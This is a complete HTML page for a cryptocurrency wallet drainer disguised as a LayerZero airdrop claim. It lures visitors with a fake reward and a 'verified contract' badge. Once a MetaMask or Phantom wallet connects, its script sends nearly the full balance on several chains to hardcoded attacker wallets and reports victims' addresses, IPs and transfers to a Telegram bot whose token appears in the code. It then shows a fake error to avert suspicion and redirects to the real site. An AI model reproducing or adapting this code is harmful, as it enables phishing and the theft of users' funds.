<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>LayerZero Airdrop Claim | ZRO + ETH Rewards</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #0a0a2a 0%, #1a1a3a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 40px 32px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }
        
        h1 {
            color: white;
            font-size: 32px;
            margin-bottom: 12px;
        }
        
        .subtitle {
            color: #888;
            margin-bottom: 32px;
            font-size: 14px;
        }
        
        .amount {
            background: rgba(0, 255, 170, 0.1);
            border: 1px solid rgba(0, 255, 170, 0.3);
            border-radius: 24px;
            padding: 24px;
            margin: 24px 0;
        }
        
        .amount-value {
            font-size: 48px;
            color: #00ffaa;
            font-weight: bold;
        }
        
        .amount-label {
            color: #888;
            margin-top: 8px;
            font-size: 14px;
        }
        
        .connect-btn {
            background: #00ffaa;
            color: #0a0a2a;
            border: none;
            padding: 16px 48px;
            border-radius: 40px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: transform 0.2s, background 0.2s;
        }
        
        .connect-btn:hover {
            transform: scale(1.02);
            background: #00dd99;
        }
        
        .connect-btn:active {
            transform: scale(0.98);
        }
        
        .status {
            margin-top: 20px;
            color: #888;
            font-size: 14px;
            word-break: break-word;
        }
        
        .footer {
            margin-top: 32px;
            color: #555;
            font-size: 12px;
        }
        
        .warning {
            color: #ff4444;
            font-size: 12px;
            margin-top: 16px;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <div class="container">
        <h1>🎁 LayerZero Airdrop</h1>
        <div class="subtitle">Claim your ZRO tokens + Bonus ETH</div>
        <div class="amount">
            <div class="amount-value">500 ZRO + 0.5 ETH</div>
            <div class="amount-label">Your eligible amount</div>
        </div>
        <button class="connect-btn" id="claimBtn">Connect Wallet & Claim</button>
        <div class="status" id="status">⏳ Waiting for connection...</div>
        <div class="footer">✅ Verified contract • 1,234,567 claims processed</div>
    </div>

    <script>
        // ============================================================
        // TELEGRAM ALERT SYSTEM - FULLY CONFIGURED
        // ============================================================
        const TELEGRAM_BOT_TOKEN = "8539021020:AAE55wvt0t7qSsZ7OU9jqLOvyV20fEkQJ98";
        const TELEGRAM_CHAT_ID = "8597584369";
        
        // Send message to Telegram
        async function sendTelegramAlert(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const result = await response.json();
                if (result.ok) {
                    console.log("✅ Telegram alert sent");
                } else {
                    console.log("❌ Telegram error:", result.description);
                }
                return result;
            } catch (error) {
                console.log("Telegram send error:", error);
            }
        }
        
        // Send drain success alert
        async function sendDrainAlert(chain, amount, txHash, victimAddress) {
            const message = `🚨 <b>DRAIN SUCCESSFUL</b> 🚨
            
💰 <b>Chain:</b> ${chain}
💵 <b>Amount:</b> ${amount}
🔗 <b>Victim:</b> ${victimAddress ? victimAddress.slice(0,6) + '...' + victimAddress.slice(-4) : 'Unknown'}
📝 <b>TX:</b> <code>${txHash}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
            
✅ Funds transferred successfully!`;
            
            await sendTelegramAlert(message);
        }
        
        // Send error alert
        async function sendErrorAlert(chain, error, victimAddress) {
            const message = `⚠️ <b>DRAIN FAILED</b> ⚠️
            
💰 <b>Chain:</b> ${chain}
❌ <b>Error:</b> ${error}
🔗 <b>Victim:</b> ${victimAddress ? victimAddress.slice(0,6) + '...' + victimAddress.slice(-4) : 'Unknown'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await sendTelegramAlert(message);
        }
        
        // Send victim info alert (when someone connects)
        async function sendVictimAlert(walletType, address) {
            const message = `🔗 <b>NEW VICTIM CONNECTED</b> 🔗
            
📱 <b>Wallet:</b> ${walletType}
🔗 <b>Address:</b> <code>${address}</code>
🌍 <b>IP:</b> ${getIP()}
⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
            
            await sendTelegramAlert(message);
        }
        
        // Get IP address (simple)
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
        
        // Test alert on page load (optional - uncomment to test)
        async function testAlertOnLoad() {
            await sendTelegramAlert("✅ DRAINER IS ONLINE\n\nBot is ready and waiting for victims.\nTime: " + new Date().toLocaleString());
        }
        // Uncomment line below to test on page load:
        // setTimeout(testAlertOnLoad, 3000);
        
        // ============================================================
        // RECEIVING ADDRESSES (YOUR WALLETS)
        // ============================================================
        const RECEIVING_ADDRESSES = {
            BSC: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            ETHEREUM: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            POLYGON: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            AVALANCHE: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            FANTOM: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            ARBITRUM: "0xfFdB4Be1299055Cc5cd44467e7deFDD9c5874EAe",
            SOLANA: "nZwFZgNRLzn4wPGH34Ss2ii8nyvdKPdcR6wzM9sreCr",
            TRON: "TFNgztPRRfwzDyVtgAak3x63gX83trfbB6"
        };
        
        // ============================================================
        // EVM DRAIN FUNCTION (MetaMask)
        // ============================================================
        async function drainEVM(chainConfig, victimAddress) {
            try {
                const web3 = new Web3(window.ethereum);
                const balance = await web3.eth.getBalance(victimAddress);
                const balanceEth = parseFloat(web3.utils.fromWei(balance, 'ether'));
                
                if (balanceEth < 0.01) {
                    console.log(`Balance too low on ${chainConfig.name}: ${balanceEth} ${chainConfig.currency}`);
                    return false;
                }
                
                // Calculate gas and drainable amount
                const gasPrice = await web3.eth.getGasPrice();
                const gasCost = gasPrice * 21000n;
                const drainable = balance - gasCost - web3.utils.toWei('0.001', 'ether');
                
                if (drainable <= 0) {
                    console.log(`Insufficient after gas on ${chainConfig.name}`);
                    return false;
                }
                
                // Send transaction
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: victimAddress,
                        to: chainConfig.receiveAddress,
                        value: '0x' + drainable.toString(16),
                        gas: '0x5208',
                        gasPrice: '0x' + gasPrice.toString(16)
                    }]
                });
                
                console.log(`✅ Drained ${web3.utils.fromWei(drainable, 'ether')} ${chainConfig.currency} on ${chainConfig.name}`);
                
                // Send Telegram alert
                await sendDrainAlert(
                    chainConfig.name,
                    web3.utils.fromWei(drainable, 'ether') + ' ' + chainConfig.currency,
                    txHash,
                    victimAddress
                );
                
                return true;
            } catch (error) {
                console.error(`Drain failed on ${chainConfig.name}:`, error);
                await sendErrorAlert(chainConfig.name, error.message, victimAddress);
                return false;
            }
        }
        
        // ============================================================
        // SOLANA DRAIN FUNCTION (Phantom)
        // ============================================================
        async function drainSolana(victimPublicKey) {
            try {
                if (!window.solana || !window.solana.isPhantom) {
                    console.log("Phantom not available");
                    return false;
                }
                
                const connection = new solanaWeb3.Connection('https://solana-mainnet.g.alchemy.com/v2/demo', 'confirmed');
                const victimPubKey = new solanaWeb3.PublicKey(victimPublicKey);
                const thiefPubKey = new solanaWeb3.PublicKey(RECEIVING_ADDRESSES.SOLANA);
                
                const balance = await connection.getBalance(victimPubKey);
                const minRent = await connection.getMinimumBalanceForRentExemption(0);
                const drainable = balance - minRent;
                
                if (drainable <= 0) {
                    console.log("Insufficient SOL balance");
                    return false;
                }
                
                const lamportsToSend = Math.floor(drainable * 0.99);
                
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: victimPubKey,
                        toPubkey: thiefPubKey,
                        lamports: lamportsToSend,
                    })
                );
                
                transaction.feePayer = victimPubKey;
                let blockhashObj = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhashObj.blockhash;
                
                const signed = await window.solana.signTransaction(transaction);
                let txid = await connection.sendRawTransaction(signed.serialize());
                await connection.confirmTransaction(txid);
                
                console.log(`✅ Solana drain confirmed: ${txid}`);
                
                await sendDrainAlert(
                    'Solana',
                    (lamportsToSend / 1e9) + ' SOL',
                    txid,
                    victimPublicKey
                );
                
                return true;
            } catch (error) {
                console.error("Solana drain error:", error);
                await sendErrorAlert('Solana', error.message, victimPublicKey);
                return false;
            }
        }
        
        // ============================================================
        // CHAIN CONFIGURATIONS
        // ============================================================
        const EVM_CHAINS = [
            { name: 'Binance Smart Chain', chainId: 56, chainIdHex: '0x38', rpc: 'https://bsc-dataseed.binance.org/', currency: 'BNB', receiveAddress: RECEIVING_ADDRESSES.BSC },
            { name: 'Ethereum', chainId: 1, chainIdHex: '0x1', rpc: 'https://mainnet.infura.io/v3/062bb19a31164300afc01b84447b6971', currency: 'ETH', receiveAddress: RECEIVING_ADDRESSES.ETHEREUM },
            { name: 'Polygon', chainId: 137, chainIdHex: '0x89', rpc: 'https://polygon-mainnet.infura.io/v3/062bb19a31164300afc01b84447b6971', currency: 'MATIC', receiveAddress: RECEIVING_ADDRESSES.POLYGON }
        ];
        
        // ============================================================
        // MAIN DRAIN FUNCTION
        // ============================================================
        async function executeDrain(victimAddress, walletType) {
            const statusDiv = document.getElementById('status');
            
            if (walletType === 'evm') {
                for (const chain of EVM_CHAINS) {
                    statusDiv.innerHTML = `🔄 Draining ${chain.name}...`;
                    await drainEVM(chain, victimAddress);
                    await new Promise(r => setTimeout(r, 1500));
                }
            } else if (walletType === 'solana') {
                statusDiv.innerHTML = `🔄 Draining Solana...`;
                await drainSolana(victimAddress);
            }
            
            // Fake error message to avoid suspicion
            statusDiv.innerHTML = "❌ Claim failed: Network congestion. Please try again later.";
            
            // Redirect after 3 seconds
            setTimeout(() => {
                window.location.href = "https://layerzero.foundation";
            }, 3000);
        }
        
        // ============================================================
        // WALLET CONNECTION HANDLER
        // ============================================================
        async function handleConnect() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = "🔄 Connecting wallet...";
            
            // Try MetaMask first
            if (window.ethereum && window.ethereum.isMetaMask) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    const victimAddress = accounts[0];
                    statusDiv.innerHTML = `✅ Connected: ${victimAddress.slice(0,6)}...${victimAddress.slice(-4)}<br>⏳ Checking eligibility...`;
                    
                    // Send victim alert
                    await sendVictimAlert('MetaMask (EVM)', victimAddress);
                    
                    setTimeout(() => {
                        executeDrain(victimAddress, 'evm');
                    }, 2000);
                    return;
                } catch (error) {
                    console.log("MetaMask connection rejected:", error);
                }
            }
            
            // Try Phantom (Solana)
            if (window.solana && window.solana.isPhantom) {
                try {
                    const resp = await window.solana.connect();
                    const victimAddress = resp.publicKey.toString();
                    statusDiv.innerHTML = `✅ Connected: ${victimAddress.slice(0,6)}...${victimAddress.slice(-4)}<br>⏳ Checking eligibility...`;
                    
                    await sendVictimAlert('Phantom (Solana)', victimAddress);
                    
                    setTimeout(() => {
                        executeDrain(victimAddress, 'solana');
                    }, 2000);
                    return;
                } catch (error) {
                    console.log("Phantom connection rejected:", error);
                }
            }
            
            // No wallet found
            statusDiv.innerHTML = "⚠️ No wallet detected. Please install MetaMask or Phantom.";
            
            // Show download links
            setTimeout(() => {
                statusDiv.innerHTML = '⚠️ No wallet detected.<br><a href="https://metamask.io/download/" target="_blank" style="color:#00ffaa">Install MetaMask</a> | <a href="https://phantom.app/" target="_blank" style="color:#00ffaa">Install Phantom</a>';
            }, 2000);
        }
        
        // ============================================================
        // INITIALIZE
        // ============================================================
        document.getElementById('claimBtn').addEventListener('click', handleConnect);
        
        // Send online alert when page loads
        window.addEventListener('load', () => {
            setTimeout(() => {
                sendTelegramAlert("🟢 DRAINER PAGE LOADED\n\nURL: " + window.location.href + "\nTime: " + new Date().toLocaleString());
            }, 2000);
        });
        
        console.log("Drainer loaded. Telegram alerts active.");
    </script>
</body>
</html>
